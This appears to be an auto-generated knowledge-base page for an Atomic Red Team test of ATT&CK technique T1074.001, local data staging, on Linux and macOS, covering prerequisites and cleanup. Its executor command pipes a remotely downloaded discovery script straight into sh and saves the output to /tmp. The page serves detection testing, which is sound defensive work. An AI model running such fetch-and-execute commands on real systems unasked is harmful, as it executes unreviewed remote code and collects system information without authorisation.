---
atomic_guid: "39ce0303-ae16-4b9e-bb5b-4f53e8262066"
title: "Stage data from Discovery.sh"
framework: "atomic"
generated: "true"
attack_technique_id: "T1074.001"
attack_technique_name: "Data Staged: Local Data Staging"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.yaml"
build_date: "2026-04-27 19:12:26"
executor: "sh"
aliases:
  - "39ce0303-ae16-4b9e-bb5b-4f53e8262066"
  - "Stage data from Discovery.sh"
platforms:
  - "linux"
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Utilize curl to download discovery.sh and execute a basic information gathering shell script

## ATT&CK Mapping

- [[kb/attack/techniques/T1074-data_staged#^t1074001-local-data-staging|T1074.001: Local Data Staging]]

## Input Arguments

### output_file

- description: Location to save downloaded discovery.bat file
- type: path
- default: /tmp/T1074.001_discovery.log

## Dependencies

Check if curl is installed on the machine.

### Prerequisite Check

```bash
if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
```

### Get Prerequisite

```bash
which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
```

## Executor

- name: sh

### Command

```bash
curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}
```

### Cleanup

```bash
rm #{output_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.yaml)
